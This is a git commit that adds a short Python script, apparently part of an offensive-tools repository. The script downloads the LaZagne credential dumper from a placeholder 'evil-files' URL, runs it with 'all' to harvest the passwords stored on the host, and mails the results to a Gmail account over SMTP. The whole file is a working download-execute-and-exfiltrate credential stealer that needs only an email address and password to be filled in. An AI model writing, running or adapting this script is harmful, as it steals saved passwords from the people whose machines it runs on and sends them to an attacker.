bb9271c09d1cea6698a7c58c0c3916bac73b00d8
Th-Shivam <dreamyshivam01@gmail.com>
2025-02-27 22:34:37 +0530

    Create dld_exe_and_rep.py

---
+++ dld_exe_and_rep.py
@@ -0,0 +1,21 @@
+import requests , subprocess , smtplib , re
+
+def download(url):
+    get_request = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open( file_name , "wb") as output_file :
+        output_file.write(get_request.content) 
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+   
+          
+download("http://test.com/evil-files/laZagne.exe") 
+command = "laZagne.exe all"
+result = subprocess.check_output(command, shell=True)
+send_mail("EMAIL", "APP PASS FOR EMAIL", result)
+# This script will send an email to the specified email address with the results of the command.
